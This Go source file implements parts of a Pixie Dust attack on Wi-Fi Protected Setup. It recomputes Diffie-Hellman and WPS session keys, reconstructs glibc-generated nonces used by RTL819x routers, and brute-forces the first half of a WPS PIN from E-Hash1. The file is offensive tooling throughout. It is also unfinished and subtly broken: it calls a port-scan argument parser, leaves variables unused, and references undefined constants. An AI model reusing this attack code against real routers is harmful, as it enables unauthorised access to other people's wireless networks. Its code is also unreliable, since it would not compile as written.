/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package pixiedust

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"
	"math/big"
	"net"
	"time"
)



type pixieDustAttack struct {
	jobs     int
	pke      []byte
	pkr      []byte
	eHash1   []byte
	eHash2   []byte
	authKey  []byte
	eNonce   []byte
	rNonce   []byte
	ebssid   net.HardwareAddr
	modes    [5]uint8
	m5enc    []byte
	m7enc    []byte
	force    bool
	dhSmall  bool
	start    string
	end      string
	cStart   int
	cEnd     int
}



func newPixieDust(args []string) pixieDustAttack {
	pda := pixieDustAttack{}
	pda.parsePortScanArgs(args)
	return pda
}



func (pda *pixieDustAttack) execute() {
	timeStart := time.Now()

	dhKey, err := computeDHKey(pda.pkr)
	
	h := hmac.New(sha256.New, dhKey)
	h.Write(append(append(pda.eNonce, pda.ebssid...), pda.rNonce...))
	kdk := h.Sum(nil)

	authkey, wrapkey, emsk := keyDerivationFunction(kdk)

	displayTime(timeStart)
}



func computeDHKey(pkr []byte) ([]byte, error) {
    eKey := bytes.Repeat([]byte{0x55}, 192)
	
    sharedSecret, err := cryptoModExp(pkr, eKey, dhGroup5Prime)
    if err != nil {
        return nil, err
    }

    dhkey := sha256.Sum256(sharedSecret)
    return dhkey[:], nil
}



func (pda *pixieDustAttack) isModeSelect(mode uint8) bool {
	if len(pda.modes) <= 0 { return false }
	
	for _, m := range pda.modes {
		if mode == m {
			return true
		}
	}

	return false
}



func (pda *pixieDustAttack) validatePKE() error {
    if !pda.isRTL819xPKE() {
        return fmt.Errorf("Model not supported! (PKE does not match RTL819x)")
    }
    return nil
}



func cryptoModExp(base, power, modulus []byte) ([]byte, error) {
    b := new(big.Int).SetBytes(base)
    e := new(big.Int).SetBytes(power)
    m := new(big.Int).SetBytes(modulus)

    if m.Sign() == 0 || m.Cmp(big.NewInt(1)) == 0 {
        return nil, errors.New("modulus must be greater than 1")
    }

    result := new(big.Int).Exp(b, e, m)

    return result.Bytes(), nil
}



func keyDerivationFunction(key []byte) (authKey, wrapKey, emsk []byte) {
	var kdfSalt  = []byte("Wi-Fi Easy and Secure Key Derivation")
    totalLen    := wpsAuthkeyLen + wpsKeywrapkeyLen + wpsEmskLen // 80 bytes
    kdkBits     := uint32(totalLen * 8)  // 640 bits
    out         := make([]byte, 0, totalLen)
   
    for i := 1; len(out) < totalLen; i++ {
        h := hmac.New(sha256.New, key)
        binary.Write(h, binary.BigEndian, uint32(i))
        h.Write(kdfSalt)
        binary.Write(h, binary.BigEndian, kdkBits)
        out = append(out, h.Sum(nil)...)
    }

    out = out[:totalLen]
	
	offset  := 0
    authKey  = out[:wpsAuthkeyLen]
	
	offset  += wpsAuthkeyLen
    wrapKey  = out[offset : offset + wpsKeywrapkeyLen]
	
	offset  += wpsKeywrapkeyLen
    emsk     = out[offset:]
    
	return
}



func emptyPinHMAC(authkey []byte) []byte {
    h := hmac.New(sha256.New, authkey)
    return h.Sum(nil)
}



var glibcSeedTbl = []uint32{
    0x0128e83b, 0x00dafa31, 0x009f4828, 0x00f66443, 0x00bee24d, 0x00817005, 0x00cb918f,
    0x00a64845, 0x0069c3cf, 0x00a76dbd, 0x0090a848, 0x0057025f, 0x0089126c, 0x007d9a8f,
    0x0048252a, 0x006fb2d4, 0x006ccc15, 0x003c5744, 0x005a998f, 0x005df917, 0x0032ed77,
    0x00492688, 0x0050e901, 0x002b5f57, 0x003acd0b, 0x00456b7a, 0x0025413d, 0x002f11f4,
    0x003b564d, 0x00203f14, 0x002589fc, 0x003283f8, 0x001c17e4, 0x001dd823,
}



func glibcFastSeed(seed uint32) uint32 {
    var word0 uint32 = 0

    // PWPS_UNERRING:
    // if seed == 0x7fffffff { seed = 0x13f835f3 }
    // if seed == 0xfffffffe { seed = 0x5df735f1 }

    for j := 3; j < 31+3-1; j++ {
        word0 += seed * glibcSeedTbl[j]

        p    := uint64(16807) * uint64(seed)
        p     = (p >> 31) + (p & 0x7fffffff)
        seed  = uint32((p >> 31) + (p & 0x7fffffff))
        // PWPS_UNERRING:
        // if seed == 0x7fffffff { seed = 0 }
    }

    word0 += seed * glibcSeedTbl[33]
    return word0 >> 1
}



func glibcFastNonce(seed uint32) []byte {
    var word0, word1, word2, word3 uint32

    for j := 0; j < 31; j++ {
        word0 += seed * glibcSeedTbl[j+3]
        word1 += seed * glibcSeedTbl[j+2]
        word2 += seed * glibcSeedTbl[j+1]
        word3 += seed * glibcSeedTbl[j+0]

        p    := uint64(16807) * uint64(seed)
        p     = (p >> 31) + (p & 0x7fffffff)
        seed  = uint32((p >> 31) + (p & 0x7fffffff))
    }

    nonce := make([]byte, 16)
    binary.BigEndian.PutUint32(nonce[0:4], word0>>1)
    binary.BigEndian.PutUint32(nonce[4:8], word1>>1)
    binary.BigEndian.PutUint32(nonce[8:12], word2>>1)
    binary.BigEndian.PutUint32(nonce[12:16], word3>>1)
    
	return nonce
}



func crackFirstHalf(authkey, eS1, pke, pkr, eHash1, emptyPsk []byte) (int, []byte, bool, bool) {
    if checkEmptyPinHalf(eS1, authkey, pke, pkr, eHash1, emptyPsk) {
        return 0, emptyPsk, true, true
    }

    for firstHalf := 0; firstHalf < 10000; firstHalf++ {
        pinhalf := fmt.Sprintf("%04d", firstHalf)
        ok, psk := checkPinHalf(authkey, eS1, pke, pkr, eHash1, pinhalf)

		if ok {
            return firstHalf, psk, true, false
        }
    }

    return 0, nil, false, false
}



func checkPinHalf(authkey, es, pke, pkr, ehash []byte, pinhalf string) (bool, []byte) {
    h := hmac.New(sha256.New, authkey)
    h.Write([]byte(pinhalf))
    psk := h.Sum(nil)

    // buffer = es || psk || pke || pkr
    h.Reset()
    h.Write(es)
    h.Write(psk)
    h.Write(pke)
    h.Write(pkr)
    hash := h.Sum(nil)

    return hmac.Equal(hash, ehash), psk
}



func checkEmptyPinHalf(es, authkey, pke, pkr, ehash, emptyPsk []byte) bool {
    h := hmac.New(sha256.New, authkey)
    h.Write(es)
    h.Write(emptyPsk)
    h.Write(pke)
    h.Write(pkr)
    hash := h.Sum(nil)
    return hmac.Equal(hash, ehash)
}



func displayTime(timeStart time.Time) {
	elapsed := time.Since(timeStart).Seconds()
    fmt.Printf("[%%] %.2f seconds in execution\n", elapsed)
}